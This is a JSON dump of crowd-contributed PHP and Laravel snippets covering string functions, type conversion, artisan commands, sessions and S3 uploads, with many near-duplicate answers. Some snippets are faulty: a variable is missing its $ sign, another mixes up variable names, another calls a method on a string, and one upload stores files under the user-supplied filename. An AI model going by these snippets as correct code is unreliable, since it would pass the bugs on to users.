    "description": "for queues with no queue name i.e. queue name = default \tphp artisan queue:work    \t\tor \tphp artisan queue:listen        for jobs with a queue name. Let's assume i have a queue with name = sendemail  \tphp artisan queue:listen --queue=sendemail         note:  queue:work will only work for jobs entries currently in jobs table in database and stop. queue:listen  will go on processing queues continously, both for current and new entries.      \nphp artisan queue:work --queue=high,default\n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4791,
    "keyword": null,
    "link": null,
    "title": " start php cli",
    "description": "php -a\nphp -r \"Print \\\"Hello, World!\\\";\" \n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4792,
    "keyword": null,
    "link": null,
    "title": " start php file",
    "description": "echo \"Hello, World!\";\n<?php //start    ?> //stop\n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4793,
    "keyword": null,
    "link": null,
    "title": " start php server",
    "description": "cd path/to/your/app php -S localhost:8000\ncd path/to/your/app/script php -S localhost:1234\n1) cd ~/public_html 2) php -S localhost:8000\nphp -S localhost:8000\n$ cd ~/public_html $ php -S localhost:8000\n <?php  // PHP code goes here  ?> \n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4794,
    "keyword": null,
    "link": null,
    "title": " start server cmd php",
    "description": "cd path/to/your/app php -S localhost:8000\nphp -S localhost:8000\n$ cd ~/public_html $ php -S localhost:8000\n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4795,
    "keyword": null,
    "link": null,
    "title": " start server in laravel",
    "description": "//laravel server command php artisan serve\nRoute::get('users', function() {     $users = User::all();      return View::make('users')->with('users', $users); });\n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4796,
    "keyword": null,
    "link": null,
    "title": " start someones laravel project",
    "description": " 1. composer update --no-scripts  or composer install  2. php artisan key:generate   3. rename example.env to .env  4. Change database credentials, set debug mode! Change app url  4. php artisan migrate(make sure u have the database running in the server)  5. php artisan config:clear  6. you are good to go! \n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4797,
    "keyword": null,
    "link": null,
    "title": " startsWith() and endsWith() functions in PHP",
    "description": "//php check if first four characters of a string = http substr( $http, 0, 4 ) === \"http\"; //php check if first five characters of a string = https substr( $https, 0, 5 ) === \"https\"; \nfunction startsWith($haystack, $needle) {      $length = strlen($needle);      return (substr($haystack, 0, $length) === $needle); }  function endsWith($haystack, $needle) {     $length = strlen($needle);     if ($length == 0) {         return true;     }      return (substr($haystack, -$length) === $needle); }\n",
    "reg_date": "2021-10-12T10:20:25.000Z"
  },
  {
    "id": 4798,
    "keyword": null,
    "link": null,
    "title": " static function php",
    "description": "<?php class Car {     public function test($var = 'Hello kinjal')     {         $this->var = $var;         return $this->var;     } } class Bike {     public static function test($var)     {         $var = '<br>this is static function';         return $var;     } } $obj = new Car(); echo $obj->test(); echo Bike::test('this is non static');      //static function called using :: double colon  ?>\n <?php class ClassName {   public static function staticMethod() {     echo \"Hello World!\";   } } ?> \n <?php function foo(){     static $int = 0;          // correct      static $int = 1+2;        // correct     static $int = sqrt(121);  // wrong  (as it is a function)      $int++;     echo $int; } ?>  \n<?php \tclass Toys \t{ \t\tprivate $toys_name; \t\tpublic $toys_category; \t\tpublic static $shop_name;  \t\tfunction Toys($name,$category)  \t\t{ \t\t\t$this->toys_name = $name; \t\t\t$this->toys_category = $category; \t\t}  \t\tpublic function getToyName()  \t\t{  \t\t\treturn $this->toys_name;  \t\t}  \t\tpublic function getToyCategory()  \t\t{  \t\t\treturn $this->toys_category;  \t\t}\t  \t\tpublic function getToyShop_nonStatic()  \t\t{  \t\t\treturn self::getToyShop();  \t\t}  \t\tpublic static function getToyShop()  \t\t{  \t\t\treturn self::$shop_name; \t\t}  \t\tpublic static function setToyShop($shopname)  \t\t{  \t\t\tself::$shop_name=$shopname;  \t\t}  \t}  \t$objToys = new Toys(\"Battery Car\",\"Battery Toys\"); \t$toys_name = $objToys->getToyName(); \t$toys_category = $objToys->getToyCategory(); \techo \"<br/>Toy: \" . $toys_name . \", Category: \" . $toys_category;  \tToys::$shop_name = \"Disney\"; \t$shop_name = Toys::getToyShop(); \techo \"<br/>Shop Name: \" . $shop_name;  \tToys::setToyShop(\"ToyShop\"); \t$shopname = Toys::getToyShop_nonStatic(); \techo \"<br/>Shop Name via non static function: \" . $shopname;  ?>\n",
    "reg_date": "2021-10-12T10:20:26.000Z"
  },
  {
    "id": 4799,
    "keyword": null,
    "link": null,
    "title": " storage image not showing in laravel",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:20:26.000Z"
  },
  {
    "id": 4800,
    "keyword": null,
    "link": null,
    "title": " store emoji in php",
    "description": "use utf8mb4 (charset) for store emoji in php database\n",
    "reg_date": "2021-10-12T10:20:26.000Z"
  },
  {
    "id": 4801,
    "keyword": null,
    "link": null,
    "title": " store image to s3 laravel",
    "description": "// Products controller use Illuminate\\Support\\Facades\\Storage;  $image = $request->file('image'); $filePath = 'images/' . $image->getClientOriginalName(); Storage::disk('s3')->put($filePath, file_get_contents($image), 'public');\n",
    "reg_date": "2021-10-12T10:20:26.000Z"
  },
  {
    "id": 4802,
    "keyword": null,
    "link": null,
    "title": " store multiple session in laravel",
    "description": "//store multipal data Session::put('user', ['first_name' => $request->get('first_name'), 'user_role' => Auth::user()->user_role, 'city' => Auth::user()->city]);  //in blade template <p>   {{Session::get('user')['city']}} </p>  @foreach (Session::get('user') as $user) \t{{$user}} @endforeach  //condtion check @if(Session::has('user'))   @foreach (Session::get('user') as $user)   \t{{ $user }}   @endforeach @endif // condition check using ternary operator {{ (Session::has('user')) ? 45 : 55}}  //delete session Session::forget('customer'); //@sujay\n",
    "reg_date": "2021-10-12T10:20:26.000Z"
  },
  {
    "id": 4803,
    "keyword": null,
    "link": null,
    "title": " store sysdate in row  phpadmin",
    "description": "CURDATE() #Format -> yyyy-mm-dd   or NOW() #Format -> yyyy-mm-dd HH:MM:SS\nNOW()\n",
    "reg_date": "2021-10-12T10:20:26.000Z"
  },
  {
    "id": 4804,
    "keyword": null,
    "link": null,
    "title": " str includes php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\nif(preg_match('(bad|naughty)', $data) === 1) { } \n<?php $string = 'The lazy fox jumped over the fence';  if (str_contains($string, '')) {     echo \"Checking the existence of an empty string will always return true\"; }  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  if (str_contains($string, 'Lazy')) {     echo 'The string \"Lazy\" was found in the string'; } else {     echo '\"Lazy\" was not found because the case does not match'; }  # Checking the existence of the empty string will always return true # The string 'lazy' was found in the string # \"Lazy\" was not found because the case does not match\n",
    "reg_date": "2021-10-12T10:20:26.000Z"
  },
  {
    "id": 4805,
    "keyword": null,
    "link": null,
    "title": " str ireplace",
    "description": " <?php $bodytag = str_ireplace(\"%body%\", \"black\", \"<body text=%BODY%>\"); echo $bodytag; // <body text=black> ?>  \n",
    "reg_date": "2021-10-12T10:20:26.000Z"
  },
  {
    "id": 4806,
    "keyword": null,
    "link": null,
    "title": " str not found laravel",
    "description": "use Illuminate\\Support\\Str;\n",
    "reg_date": "2021-10-12T10:20:26.000Z"
  },
  {
    "id": 4807,
    "keyword": null,
    "link": null,
    "title": " str replace php",
    "description": "<?php //str_replace(\"Original Value\", \"Value to be replaced\", \"String\"); $result = str_replace(\"1\", \"2\", \"This is number 1\"); // Output: This is number 2 ?>\nstr_replace ($search, $replace, $subject);\n$var1 = 'hello.world'; $var2 = str_replace(\".\", \"-\", $var1); echo $var2; // hello-world \necho str_replace(\"worss\",\"world\",\"Hello worss in PHP!!\");\n//replaces every occurence of $search with $replace in the string $subject str_replace ($search, $replace, $subject);\nstr_replace ( array|string $needle , array|string $needle_replacement , string|array $haystack , int &$output_count = null ) : string|array str_replace ($needle, $needle_replacement, $haystack, $output_count);   // $needle --> the string value or array of string values you're looking for   // $needle_replacement --> the string value or array of string values you'll replace the needle(s) with   // $haysytack --> the string or array of strings you'd like to search/replace needles in   // $output_count --> not an input, but can be used to get an aggregator to count how many needles were replaced  str_replace ($needle, $needle_replacement, $haystack) //w/out count\n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4808,
    "keyword": null,
    "link": null,
    "title": " str replace php variable",
    "description": "<?php //str_replace(\"Original Value\", \"Value to be replaced\", \"String\"); $result = str_replace(\"1\", \"2\", \"This is number 1\"); // Output: This is number 2 ?>\n$var1 = 'hello.world'; $var2 = str_replace(\".\", \"-\", $var1); echo $var2; // hello-world \n$var1 = 'hello_john'; $var2 = str_replace(\"_\", \"-\", $var1); echo $var2; // hello-john\n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4809,
    "keyword": null,
    "link": null,
    "title": " str shuffle in php",
    "description": "<?php $i_arr = [\"html\", \"css\", \"javascript\", \"php\", \"vue\", \"react\"];  echo \"<pre>\"; print_r($i_arr); echo \"</pre>\";  shuffle($i_arr);  echo \"<pre>\"; print_r($i_arr); echo \"</pre>\"; ?>\nstr_shuffle(\"You are beautiful\");\n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4810,
    "keyword": null,
    "link": null,
    "title": " strcasecmp php",
    "description": "<?php echo strcasecmp(\"Hello world!\",\"HELLO WoRLD!\"); ?>  <p>If this function returns 0, the two strings are equal.</p>\n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4811,
    "keyword": null,
    "link": null,
    "title": " stream set blocking",
    "description": "#Used to set blocking/non-blocking mode on a stream  stream_set_blocking ( resource $stream , bool $enable )  #Returns a bool value.\n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4812,
    "keyword": null,
    "link": null,
    "title": " string compare in php",
    "description": "<?php $var1 = \"Hello\"; $var2 = \"hello\"; if (strcmp($var1, $var2) !== 0) {     echo '$var1 is not equal to $var2 in a case sensitive string comparison'; } ?>\n//In php to compare two string we can use strcmp() function Syntax strcmp(string1,string2);  //If both string is same then it will return 0 <?php echo strcmp(\"Hello world!\",\"Hello world!\"); ?>\n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4813,
    "keyword": null,
    "link": null,
    "title": " string contains php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$string = 'The lazy fox jumped over the fence';  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  \n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; } \nif (strpos($string, 'substring') !== false) { \t// do stuff  }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; } ?>  \n<?php $string = 'The lazy fox jumped over the fence';  if (str_contains($string, '')) {     echo \"Checking the existence of an empty string will always return true\"; }  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  if (str_contains($string, 'Lazy')) {     echo 'The string \"Lazy\" was found in the string'; } else {     echo '\"Lazy\" was not found because the case does not match'; }  # Checking the existence of the empty string will always return true # The string 'lazy' was found in the string # \"Lazy\" was not found because the case does not match\n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4814,
    "keyword": null,
    "link": null,
    "title": " string first letter uppercase php",
    "description": " <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?>  \nucwords(\"hello world\"); // Hello World ucfirst(\"hello world\"); // Hello world\nucfirst(\"hello world!\");\n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4815,
    "keyword": null,
    "link": null,
    "title": " string json format to object in php",
    "description": "<?php   // JSON string   $someJSON = '[{\"name\":\"Jonathan Suh\",\"gender\":\"male\"},{\"name\":\"William Philbin\",\"gender\":\"male\"},{\"name\":\"Allison McKinnery\",\"gender\":\"female\"}]';    // Convert JSON string to Array   $someArray = json_decode($someJSON, true);   print_r($someArray);        // Dump all data of the Array   echo $someArray[0][\"name\"]; // Access Array data    // Convert JSON string to Object   $someObject = json_decode($someJSON);   print_r($someObject);      // Dump all data of the Object   echo $someObject[0]->name; // Access Object data ?> \n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4816,
    "keyword": null,
    "link": null,
    "title": " string length in php",
    "description": " <?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>  \n<?php $name = 'abcdef'; echo strlen($str); // 6  $string = ' ab cd '; echo strlen($str); // 7 ?>\n<?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>\n<?php $str = 'php'; echo strlen($str); // 3  $str = 's p a c e'; echo strlen($str); // 9 ?>\n<?php $str = 'Hello World!'; echo strlen($str); // 12 ?>\n/* To measure the length of string there is built-in function in php which returns the exact length of string. */  Syntax: strlen(paramenter);  <?php $name = 'ankur'; echo \"Name Length : \".strlen($name);  // Name Length : 5  $message = 'Welcome greppers !'; echo \"Message Length : \".strlen($message);  // Message Length : 18 ?>    /* I hope it will help you. Namaste */\n",
    "reg_date": "2021-10-12T10:20:27.000Z"
  },
  {
    "id": 4817,
    "keyword": null,
    "link": null,
    "title": " string length php",
    "description": " <?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>  \n<?php $name = 'abcdef'; echo strlen($str); // 6  $string = ' ab cd '; echo strlen($str); // 7 ?>\n<?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>\n<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\n<?php $str = 'php'; echo strlen($str); // 3  $str = 's p a c e'; echo strlen($str); // 9 ?>\n$name = \"Per&uacute;\"; // With accent mark echo strlen($name); // Display 5, because \"&uacute;\" require 2 bytes.  $name = \"Peru\"; // Without accent mark echo strlen($name); // Display 4\n",
    "reg_date": "2021-10-12T10:20:28.000Z"
  },
  {
    "id": 4818,
    "keyword": null,
    "link": null,
    "title": " string remove line breaks php",
    "description": "$text = preg_replace(\"/\\r|\\n/\", \"\", $text);\npreg_replace( \"/\\r|\\n/\", \"\", $yourString );\n$str = preg_replace('/(\\v|\\s)+/', ' ', $str); \n",
    "reg_date": "2021-10-12T10:20:28.000Z"
  },
  {
    "id": 4819,
    "keyword": null,
    "link": null,
    "title": " string replace php",
    "description": "<?php //str_replace(\"Original Value\", \"Value to be replaced\", \"String\"); $result = str_replace(\"1\", \"2\", \"This is number 1\"); // Output: This is number 2 ?>\nstr_replace ($search, $replace, $subject);\n$var1 = 'hello.world'; $var2 = str_replace(\".\", \"-\", $var1); echo $var2; // hello-world \n$new_string = str_replace( $take_out, $put_in, $string);\necho str_replace(\"worss\",\"world\",\"Hello worss in PHP!!\");\n#Definition: str_replace ( array|string $needle , array|string $needle_replacement , string|array $haystack , int &$output_count = null ) : string|array str_replace ($needle, $needle_replacement, $haystack, $output_count);   // $needle --> the string value or array of string values you're looking for   // $needle_replacement --> the string value or array of string values you'll replace the needle(s) with   // $haysytack --> the string or array of strings you'd like to search/replace needles in   // $output_count --> not an input, but can be used to get an aggregator to count how many needles were replaced  #Simple Example: echo str_replace(\"_\", \" \", \"Hello_World_of_PHP\");   // Prints: \"Hello World of PHP\"  #Complex Example:   $vowels = array(\"a\", \"e\", \"i\", \"o\", \"u\", \"A\", \"E\", \"I\", \"O\", \"U\"); /*OR*/ $vowels = [\"a\", \"e\", \"i\", \"o\", \"u\", \"A\", \"E\", \"I\", \"O\", \"U\"]; echo str_replace($vowels, \"\", \"Hello World of PHP\", $count);   // Prints: \"Hll Wrld f PHP\" echo $count   // Prints: \"4\"  #This function is case-sensitive.    #Use str_ireplace() for case-insensitive replace.\n",
    "reg_date": "2021-10-12T10:20:28.000Z"
  },
  {
    "id": 4820,
    "keyword": null,
    "link": null,
    "title": " string replace smarty",
    "description": "{$articleTitle|replace:'Garden':'Vineyard'}\n",
    "reg_date": "2021-10-12T10:20:28.000Z"
  },
  {
    "id": 4821,
    "keyword": null,
    "link": null,
    "title": " string replace twig",
    "description": "{{description|replace({\"\\'\": \"'\"})|raw }}\n",
    "reg_date": "2021-10-12T10:20:28.000Z"
  },
  {
    "id": 4822,
    "keyword": null,
    "link": null,
    "title": " string to array in laravel",
    "description": "$explode_id = json_decode($request->data, true); \n",
    "reg_date": "2021-10-12T10:20:28.000Z"
  },
  {
    "id": 4823,
    "keyword": null,
    "link": null,
    "title": " string to array in php",
    "description": "$myString = \"9,admin@example.com,8\"; $myArray = explode(',', $myString); print_r($myArray);\n$array = explode(' ', $string); \nprint_r(explode(',',$yourstring));\nexplode(\" \",\"Geeks for Geeks\")\n <?php  $str = \"Hello world. It's a beautiful day.\"; print_r (explode(\" \",$str));  ?> \nexplode()\n",
    "reg_date": "2021-10-12T10:20:28.000Z"
  },
  {
    "id": 4824,
    "keyword": null,
    "link": null,
    "title": " string to bool php",
    "description": "/** filter_var - Filters a variable with a specific filter **/ $boolvar = filter_var('true', FILTER_VALIDATE_BOOLEAN); /** boolval - Get the boolean value of a variable PHP 5 >= */ $boolvar = boolval ('true'); // And literally with a ternary operator but I can't recommend it $boolvar = ($string === 'true')  ? true: false;   /** We can convert any variable to boolean --- using the (bool) or (boolean) keyword ----- *** But we are talking about conversion not casting *** -   So any String whose length is greater than 0 is true  -   and any number other than 0 is true **/ echo $boolvar = (bool)1; //return true echo $boolvar = (bool)\"true\"; //return true echo $boolvar = (bool)\"false\"; //return true echo $boolvar = (bool)0; //return false echo $boolvar = (bool)\"\"; //return false  var_dump((bool) 0);//return false  var_dump((bool) \"\");//return false \nboolval('false');\n/**  * Strings always evaluate to boolean true unless they have a  * value that's considered \"empty\" by PHP (taken from the  * documentation for empty):  * \"\" (an empty string) evaluates as false.  * \"0\" (0 as a string) evaulates as false.  * If you need to set a boolean based on the text value of a  * string, then you'll need to check for the presence or  * otherwise of that value.  */ $boolean = $string === 'true' ? true: false;\n// (PHP 5 >= 5.5.0, PHP 7) // boolval &mdash; Get the boolean value of a variable boolval ( mixed $var ) : bool // Returns the boolean value of var.\n",
    "reg_date": "2021-10-12T10:20:28.000Z"
  },
  {
    "id": 4825,
    "keyword": null,
    "link": null,
    "title": " string to carbon",
    "description": "$date = Carbon\\Carbon::parse($rawDate);\n",
    "reg_date": "2021-10-12T10:20:28.000Z"
  },
  {
    "id": 4826,
    "keyword": null,
    "link": null,
    "title": " string to datetime php",
    "description": "$time = strtotime('10/16/2003');  $newformat = date('Y-m-d',$time);  echo $newformat; // 2003-10-16 \n$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n$s = '08/11/2010 19:37:02'; $date = strtotime($s); echo date('Y-m-d H:i:s', $date);\n$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date);\n$date = DateTime::createFromFormat('d-m-Y', '15-12-2020');\n$s = '06/10/2011 19:00:02';$date = strtotime($s);echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4827,
    "keyword": null,
    "link": null,
    "title": " string to decimal php",
    "description": "intval($string);\n$stringVal = \"12.06\"; $stringConvertedToFloat = floatval( $stringVal ); // The floatval function will return the argument converted // to a float value if the value can be converted. // IF the value cannot be converted these are the values that will be // returned: // Empty Array: returns 0. eg: floatval([]); // Non-Empty Array: returns 1. eg: floatval([\"ab\", \"12\"]) // String with a non-numeric value as the left most character: returns 0. eg: floatval(\"ab12\") // String with one or more numeric values as the left most characters: returns those characters as a float. eg: floatval(\"12ab1\") will return 12. // Oh the joys of php\n$num = (double) \"10.12\";\nfloatval ($var) \n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4828,
    "keyword": null,
    "link": null,
    "title": " string to double php",
    "description": "$floatValue = floatval(\"1.0\");\n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4829,
    "keyword": null,
    "link": null,
    "title": " string to float php",
    "description": "$stringVal = \"12.06\"; $stringConvertedToFloat = floatval( $stringVal ); // The floatval function will return the argument converted // to a float value if the value can be converted. // IF the value cannot be converted these are the values that will be // returned: // Empty Array: returns 0. eg: floatval([]); // Non-Empty Array: returns 1. eg: floatval([\"ab\", \"12\"]) // String with a non-numeric value as the left most character: returns 0. eg: floatval(\"ab12\") // String with one or more numeric values as the left most characters: returns those characters as a float. eg: floatval(\"12ab1\") will return 12. // Oh the joys of php\n$floatValue = floatval(\"1.0\");\nfloatval ($var) \nphpCopy<?php $mystring = \"0.5674\"; echo(\"This float number is of string data type \"); echo($mystring); echo(\"\\n\"); $myfloat = floatval($mystring); echo(\"Now, this float number is of float data type \"); echo($myfloat); ?> \nphpCopy<?php $mystring = \"0.5674\"; echo(\"This float number is of string data type \"); echo($mystring); echo(\"\\n\"); $myfloat = (float) $mystring; echo(\"Now, this float number is of float data type \"); echo($myfloat); ?> \nphpCopy<?php $mystring = \"0.5674\"; echo(\"This float number is of string data type \"); echo($mystring); echo(\"\\n\"); $myfloat = number_format($mystring, 4); echo(\"Now, this float number is of float data type \"); echo($myfloat); ?> \n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4830,
    "keyword": null,
    "link": null,
    "title": " string to int php",
    "description": "intval($string);\n$int = intval($float);\ns = \"123\"; echo intval(s); // 123  s = \"hello\"; echo intval(s);\t//0\nphpCopy<?php   $variable = \"abc\"; $integer = (int)$variable; echo \"The variable has converted to a number and its value is $integer.\";   ?> \n$num = \"3.14\";  $int = (int)$num;//string to int $float = (float)$num;//string to float\n$str = \"10\"; $num = (int)$str;\n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4831,
    "keyword": null,
    "link": null,
    "title": " string to uppercase laravel",
    "description": "public function getProvince($value) {     return strtoupper($value); } \n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4832,
    "keyword": null,
    "link": null,
    "title": " stristr php",
    "description": "#Case-insensitive strstr() #stristr(string $haystack, string $needle, bool $before_needle = false): string|false #Returns all of haystack starting from and including the first occurrence of needle to the end.  <?php   $email = 'USER@EXAMPLE.com';   echo stristr($email, 'e'); // outputs ER@EXAMPLE.com   echo stristr($email, 'e', true); // outputs US ?>\n<?php   $string = 'Hello World!';   if(stristr($string, 'terre') === FALSE) {    echo '\"terre\" non trouv&eacute; dans la cha&icirc;ne de caract&egrave;res';   } // affiche : \"terre\" non trouv&eacute; dans la cha&icirc;ne de caract&egrave;res ?>\nstristr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] ) : string \n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4833,
    "keyword": null,
    "link": null,
    "title": " strlen php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n <?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>  \n<?php $name = 'abcdef'; echo strlen($str); // 6  $string = ' ab cd '; echo strlen($str); // 7 ?>\n<?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>\n<?php echo strlen(\"Hello world!\");\t// will output 12 ?>\n<?php  $string='YourString';  echo strlen($string); //outputs 10  /*** how do it will count   Y  | o |  u |  r  | S | t  | r  | i  | n  |  g  1  | 2 |  3 |  4  | 5 | 6  | 7  | 8  | 9  | 10 ***/ ?>\n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4834,
    "keyword": null,
    "link": null,
    "title": " strpos in php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; } ?>  \n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // El operador !== tambi&eacute;n puede ser usado. Puesto que != no funcionar&aacute; como se espera // porque la posici&oacute;n de 'a' es 0. La declaraci&oacute;n (0 != false) se eval&uacute;a a  // false. if ($pos !== false) {      echo \"La cadena '$findme' fue encontrada en la cadena '$mystring'\";          echo \" y existe en la posici&oacute;n $pos\"; } else {      echo \"La cadena '$findme' no fue encontrada en la cadena '$mystring'\"; } ?>  \n$mystr = 'abc'; $findMe   = 'a'; $position = strpos($mystr, $findMe);\n <?php // We can search for the character, ignoring anything before the offset $newstring = 'abcdef abcdef'; $pos = strpos($newstring, 'a', 1); // $pos = 7, not 0 ?>  \n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4835,
    "keyword": null,
    "link": null,
    "title": " strpos php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; } ?>  \n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // El operador !== tambi&eacute;n puede ser usado. Puesto que != no funcionar&aacute; como se espera // porque la posici&oacute;n de 'a' es 0. La declaraci&oacute;n (0 != false) se eval&uacute;a a  // false. if ($pos !== false) {      echo \"La cadena '$findme' fue encontrada en la cadena '$mystring'\";          echo \" y existe en la posici&oacute;n $pos\"; } else {      echo \"La cadena '$findme' no fue encontrada en la cadena '$mystring'\"; } ?>  \n<?php function g($string,$start,$end){      preg_match_all('/' . preg_quote($start, '/') . '(.*?)'. preg_quote($end, '/').'/i', $string, $m);      $out = array();       foreach($m[1] as $key => $value){        $type = explode('::',$value);        if(sizeof($type)>1){           if(!is_array($out[$type[0]]))              $out[$type[0]] = array();           $out[$type[0]][] = $type[1];        } else {           $out[] = $value;        }      }   return $out; } print_r(g('Sample text, [/text to extract/] Rest of sample text [/WEB::http://google.com/] bla bla bla. ','[/','/]')); ?>  results: Array (     [0] => text to extract     [WEB] => Array         (             [0] => http://google.com         )  )  Can be helpfull to custom parsing :)   \n",
    "reg_date": "2021-10-12T10:20:29.000Z"
  },
  {
    "id": 4836,
    "keyword": null,
    "link": null,
    "title": " strtolower php",
    "description": "/* strtolower() function converts  string to lowercase. */ <?php echo strtolower(\"Hello WORLD 123\"); ?> // Output:hello world 123\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world' $string = 'HeLlO WoRlD'; echo strtolower($string); //Output: 'hello world'\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world'\n/* The strtolower() function converts a string to lowercase. Convert all characters to lowercase.*/ <?php echo strtolower(\"Hello WORLD.\"); ?> // Output: hello world.\nThe strtolower() function is used to convert a string into lowercase. This function takes a string as parameter and converts all the uppercase english alphabets present in the string to lowercase.\n/* There is a function in php wich convert all paragraph or  string to lowercase*/ <?php echo strtolower(\"Hey Samy, HAVE YOU CHECK THE LATEST MOVIE.\");   // Output: hey samy, have you check the latest movie. ?> \n",
    "reg_date": "2021-10-12T10:20:30.000Z"
  },
  {
    "id": 4837,
    "keyword": null,
    "link": null,
    "title": " strtotime add 1 hour",
    "description": "$my_date_time = date(\"Y-m-d H:i:s\", strtotime(\"+1 hours\"))\n",
    "reg_date": "2021-10-12T10:20:30.000Z"
  },
  {
    "id": 4838,
    "keyword": null,
    "link": null,
    "title": " strtotime format",
    "description": "$date = '25/05/2010'; $date = str_replace('/', '-', $date); echo date('Y-m-d', strtotime($date));\n$date = '25/05/2010'; $date = str_replace('/', '-', $date); echo date('Y-m-d', strtotime($date)); \n",
    "reg_date": "2021-10-12T10:20:30.000Z"
  },
  {
    "id": 4839,
    "keyword": null,
    "link": null,
    "title": " strtotime laravel",
